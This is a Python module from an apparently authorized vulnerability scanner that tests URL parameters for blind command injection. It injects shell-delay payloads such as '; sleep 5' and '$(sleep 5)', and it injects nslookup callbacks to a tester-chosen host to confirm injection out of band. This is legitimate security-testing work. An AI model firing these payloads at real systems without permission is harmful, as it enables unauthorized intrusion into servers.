"""Blind command-injection timing and non-exfiltrating DNS callbacks."""

import logging
import time
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
import uuid

import requests

import config
from core.http import create_session
from scanners.base_scanner import BaseScanner


LOGGER = logging.getLogger(__name__)


class BlindCommandInjectionTester(BaseScanner):
    scanner_name = "blind_cmdi"
    total_checks = 2
    PARAM_NAMES = {
        "file", "filename", "path", "cmd", "command", "exec", "execute",
        "ping", "host", "ip", "query", "search", "process", "run", "shell",
    }
    DELAY_PAYLOADS = (
        "; sleep 5", "| sleep 5", "& sleep 5", "`sleep 5`", "$(sleep 5)",
        "& timeout /t 5", "| timeout /t 5",
    )

    def __init__(self, target, *args, **kwargs):
        super().__init__(target, *args, **kwargs)
        self.session = create_session(
            f"Bug-Hunter-Pro/{config.APP_VERSION} Authorized-OOB-Validation"
        )
        self.attempts = []

    def scan(self, target_url=None, callback_url="", authorized=False):
        if not authorized:
            raise PermissionError("Explicit authorization is required")
        if target_url:
            self.target = self.normalize_target(target_url)
        for point in self._get_injection_params(self.target):
            self._time_based_test(*point)
            if callback_url:
                self._oob_test(*point, callback_url)
        self.status = "completed"
        return {"findings": self.get_findings(), "attempts": self.attempts}

    def run(self):
        return self.scan(authorized=True)

    def _get_injection_params(self, target_url):
        parsed = urlparse(target_url)
        return [
            (target_url, name, value)
            for name, value in parse_qsl(parsed.query, keep_blank_values=True)
            if name.lower() in self.PARAM_NAMES
        ][:20]

    def _request(self, url, param, value):
        parsed = urlparse(url)
        query = dict(parse_qsl(parsed.query, keep_blank_values=True))
        query[param] = value
        return self.session.get(
            urlunparse(parsed._replace(query=urlencode(query))),
            timeout=max(config.SCAN_TIMEOUT, 8),
        )

    def _time_based_test(self, url, param, original):
        try:
            started = time.monotonic()
            self._request(url, param, original)
            baseline = time.monotonic() - started
        except requests.RequestException:
            return
        for payload in self.DELAY_PAYLOADS:
            timings = []
            for _ in range(2):
                try:
                    started = time.monotonic()
                    self._request(url, param, f"{original}{payload}")
                    timings.append(time.monotonic() - started)
                except requests.RequestException:
                    break
            if len(timings) == 2 and all(value > baseline + 4 for value in timings):
                self.add_finding(
                    "Confirmed time-based command injection",
                    "HIGH",
                    "A command-like delay payload caused two repeatable response delays.",
                    (
                        f"Parameter: {param}\nPayload: {payload}\nBaseline: {baseline:.2f}s\n"
                        f"Timings: {', '.join(f'{value:.2f}s' for value in timings)}"
                    ),
                    "Avoid shell invocation, use safe process APIs, and strictly allowlist inputs.",
                    8.8,
                    "A03:2021 Injection",
                    "T1059 Command and Scripting Interpreter",
                    url,
                )
                return

    def _oob_test(self, url, param, original, callback_url):
        host = urlparse(
            callback_url if "://" in callback_url else f"//{callback_url}"
        ).hostname or callback_url.split(":")[0]
        correlation = str(uuid.uuid4())
        payloads = (
            f"; nslookup {correlation}.cmdi.{host}",
            f"| nslookup {correlation}.cmdi.{host}",
            f"& nslookup {correlation}.cmdi.{host}",
        )
        for payload in payloads:
            try:
                response = self._request(url, param, f"{original}{payload}")
                status = response.status_code
            except requests.RequestException:
                status = None
            self.attempts.append(
                {
                    "id": correlation,
                    "parameter": param,
                    "payload": payload,
                    "status_code": status,
                    "target_url": url,
                }
            )
